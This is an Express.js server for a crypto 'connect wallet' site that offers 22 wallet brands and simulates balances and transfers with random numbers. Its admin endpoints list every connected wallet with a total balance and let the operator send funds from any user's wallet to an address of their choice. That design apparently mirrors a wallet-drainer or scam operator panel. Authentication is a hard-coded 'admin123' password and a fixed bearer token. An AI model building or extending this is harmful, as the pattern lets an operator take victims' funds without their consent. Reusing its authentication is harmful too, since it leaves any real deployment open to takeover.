const express = require('express');
const path = require('path');
const Web3 = require('web3');
const app = express();
const PORT = 3000;

// In-memory storage (use database in production)
let connectedWallets = [];
let transactions = [];
let adminPassword = "admin123"; // Change this in production

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));

// API Routes

// Connect wallet
app.post('/api/connect', (req, res) => {
    const { address, walletType, chainId } = req.body;
    
    if (!address || !walletType) {
        return res.status(400).json({ error: 'Missing required fields' });
    }
    
    // Check if wallet already connected
    const existingWallet = connectedWallets.find(w => w.address === address);
    if (existingWallet) {
        return res.json({
            success: true,
            message: 'Wallet already connected',
            wallet: existingWallet
        });
    }
    
    const newWallet = {
        id: Date.now().toString(),
        address: address,
        walletType: walletType,
        chainId: chainId || '0x1',
        balance: '0',
        isConnected: true,
        connectedAt: new Date().toISOString(),
        lastActivity: new Date().toISOString()
    };
    
    connectedWallets.push(newWallet);
    
    // Simulate fetching balance (in real app, fetch from blockchain)
    const simulatedBalance = (Math.random() * 10).toFixed(4);
    newWallet.balance = simulatedBalance;
    
    res.json({
        success: true,
        message: 'Wallet connected successfully',
        wallet: newWallet
    });
});

// Get wallet balance
app.post('/api/balance', (req, res) => {
    const { address } = req.body;
    
    const wallet = connectedWallets.find(w => w.address === address);
    if (!wallet) {
        return res.status(404).json({ error: 'Wallet not found' });
    }
    
    // Update balance (simulated)
    const newBalance = (parseFloat(wallet.balance) + (Math.random() * 0.1 - 0.05))
        .toFixed(4);
    wallet.balance = Math.max(0, newBalance).toString();
    
    res.json({
        success: true,
        balance: wallet.balance,
        address: wallet.address
    });
});

// Estimate gas fee
app.post('/api/estimate-gas', (req, res) => {
    const { from, to, amount, cryptoType } = req.body;
    
    // Simulate gas estimation
    const baseGas = cryptoType === 'ETH' ? 21000 : 140;
    const gasPrice = 30; // gwei
    
    const gasFee = (baseGas * gasPrice * 1e-9).toFixed(8);
    
    res.json({
        success: true,
        gasFee: gasFee,
        gasPrice: `${gasPrice} gwei`,
        total: (parseFloat(amount) + parseFloat(gasFee)).toFixed(8)
    });
});

// Send transaction (simulated)
app.post('/api/send', (req, res) => {
    const { from, to, amount, cryptoType, gasFee } = req.body;
    
    // Find sender wallet
    const senderWallet = connectedWallets.find(w => w.address === from);
    if (!senderWallet) {
        return res.status(404).json({ error: 'Sender wallet not found' });
    }
    
    // Check balance
    const currentBalance = parseFloat(senderWallet.balance);
    const sendAmount = parseFloat(amount);
    const totalCost = sendAmount + parseFloat(gasFee || 0);
    
    if (currentBalance < totalCost) {
        return res.status(400).json({ error: 'Insufficient balance' });
    }
    
    // Update balance
    senderWallet.balance = (currentBalance - totalCost).toFixed(4);
    senderWallet.lastActivity = new Date().toISOString();
    
    // Record transaction
    const transaction = {
        id: Date.now().toString(),
        from: from,
        to: to,
        amount: amount,
        cryptoType: cryptoType,
        gasFee: gasFee || '0',
        status: 'completed',
        timestamp: new Date().toISOString(),
        txHash: `0x${Date.now().toString(16)}${Math.random().toString(16).substr(2)}`
    };
    
    transactions.push(transaction);
    
    res.json({
        success: true,
        message: 'Transaction sent successfully',
        transaction: transaction,
        newBalance: senderWallet.balance
    });
});

// Admin login
app.post('/api/admin/login', (req, res) => {
    const { password } = req.body;
    
    if (password === adminPassword) {
        res.json({
            success: true,
            message: 'Admin login successful',
            token: 'admin-token-simulated' // Use JWT in production
        });
    } else {
        res.status(401).json({ error: 'Invalid password' });
    }
});

// Get all connected wallets (admin only)
app.get('/api/admin/wallets', (req, res) => {
    const { authorization } = req.headers;
    
    // Simple auth check (use proper JWT in production)
    if (!authorization || authorization !== 'Bearer admin-token-simulated') {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    res.json({
        success: true,
        wallets: connectedWallets,
        totalConnected: connectedWallets.length,
        totalBalance: connectedWallets.reduce((sum, w) => sum + parseFloat(w.balance), 0).toFixed(4)
    });
});

// Admin send from user wallet
app.post('/api/admin/send', (req, res) => {
    const { authorization } = req.headers;
    const { fromAddress, toAddress, amount, cryptoType } = req.body;
    
    // Auth check
    if (!authorization || authorization !== 'Bearer admin-token-simulated') {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    // Find sender wallet
    const senderWallet = connectedWallets.find(w => w.address === fromAddress);
    if (!senderWallet) {
        return res.status(404).json({ error: 'Wallet not found' });
    }
    
    // Check balance
    const currentBalance = parseFloat(senderWallet.balance);
    const sendAmount = parseFloat(amount);
    
    if (currentBalance < sendAmount) {
        return res.status(400).json({ error: 'Insufficient balance' });
    }
    
    // Update balance
    senderWallet.balance = (currentBalance - sendAmount).toFixed(4);
    senderWallet.lastActivity = new Date().toISOString();
    
    // Record transaction
    const transaction = {
        id: Date.now().toString(),
        from: fromAddress,
        to: toAddress,
        amount: amount,
        cryptoType: cryptoType || 'ETH',
        gasFee: '0',
        status: 'admin_completed',
        adminInitiated: true,
        timestamp: new Date().toISOString(),
        txHash: `0x${Date.now().toString(16)}${Math.random().toString(16).substr(2)}`
    };
    
    transactions.push(transaction);
    
    res.json({
        success: true,
        message: 'Admin transaction completed',
        transaction: transaction,
        newBalance: senderWallet.balance
    });
});

// Get available wallets
app.get('/api/wallets', (req, res) => {
    // List of 20+ popular wallets
    const wallets = [
        { id: 'metamask', name: 'MetaMask', type: 'extension' },
        { id: 'trustwallet', name: 'Trust Wallet', type: 'mobile' },
        { id: 'coinbase', name: 'Coinbase Wallet', type: 'mobile' },
        { id: 'walletconnect', name: 'WalletConnect', type: 'qr' },
        { id: 'phantom', name: 'Phantom', type: 'extension' },
        { id: 'ledger', name: 'Ledger Live', type: 'hardware' },
        { id: 'trezor', name: 'Trezor', type: 'hardware' },
        { id: 'brave', name: 'Brave Wallet', type: 'browser' },
        { id: 'exodus', name: 'Exodus', type: 'desktop' },
        { id: 'atomic', name: 'Atomic Wallet', type: 'desktop' },
        { id: 'myetherwallet', name: 'MyEtherWallet', type: 'web' },
        { id: 'argent', name: 'Argent', type: 'mobile' },
        { id: 'rainbow', name: 'Rainbow', type: 'mobile' },
        { id: 'mathwallet', name: 'Math Wallet', type: 'mobile' },
        { id: 'tokenpocket', name: 'TokenPocket', type: 'mobile' },
        { id: 'safepal', name: 'SafePal', type: 'hardware' },
        { id: 'bitkeep', name: 'BitKeep', type: 'extension' },
        { id: 'zenGo', name: 'ZenGo', type: 'mobile' },
        { id: 'alpha', name: 'Alpha Wallet', type: 'mobile' },
        { id: 'crypto.com', name: 'Crypto.com DeFi Wallet', type: 'mobile' },
        { id: '1inch', name: '1inch Wallet', type: 'mobile' },
        { id: 'binance', name: 'Binance Chain Wallet', type: 'extension' }
    ];
    
    res.json({ success: true, wallets });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log(`User interface: http://localhost:${PORT}`);
    console.log(`Admin interface: http://localhost:${PORT}/admin.html`);
});
